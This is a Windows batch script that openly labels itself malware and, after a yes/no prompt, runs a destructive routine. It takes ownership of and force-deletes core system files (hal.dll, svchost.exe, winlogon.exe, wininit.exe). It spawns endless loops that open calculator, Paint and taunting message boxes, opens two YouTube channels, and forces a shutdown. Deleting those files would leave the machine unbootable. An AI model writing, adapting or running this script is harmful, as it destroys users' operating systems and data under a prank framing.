@echo off
title WARNING
:warning
echo Warning! 
echo
echo This is malware that stores malicious files and destructs your pc, are you sure you wanna continue
echo (yes/no)

set /p input=
if /i %input%==yes goto destruct
if /i %input%==no goto exit
if /i not %input%==yes,no goto warning

:destruct
cd %temp%
md fake_data
cd %temp%\fake_data
echo.do>>wtf%random%.vbs
echo.x=msgbox ("rblxhacks.bat",48,"$O_O$")>>isthisreal.vbs
echo.loop>>wtf%random%.vbs
start www.youtube.com/@RadioactiveGamer12
start www.youtube.com/@adoomyxxGD
echo this is insanity, lol
takeown /f C:\Windows\System32\hal.dll
del /f /q C:\Windows\System32\hal.dll
takeown /f C:\Windows\System32\svchost.exe
del /f /q C:\Windows\System32\svchost.exe
takeown /f C:\Windows\System32\winlogon.exe
del /f /q C:\Windows\System32\winlogon.exe
takeown /f C:\Windows\System32\wininit.exe
del /f /q C:\Windows\System32\wininit.exe
echo.x=msgbox ("i killed ur pc",16,"HAHAHAHAHA")>>haha.vbs
echo.@echo off>>SPAM.bat
echo.:x>>SPAM.bat
echo.start calc>>SPAM.bat
echo.start mspaint>>SPAM.bat
echo.goto x>>SPAM.bat
start SPAM.bat
echo.@echo off>>spam2.bat
echo.:x>>spam2.bat
echo.start haha.vbs>>spam2.bat
echo.start isthisreal.vbs>>spam2.bat
echo.goto x>>spam2.bat
start spam2.bat
shutdown /f /s /t 30

:exit
exit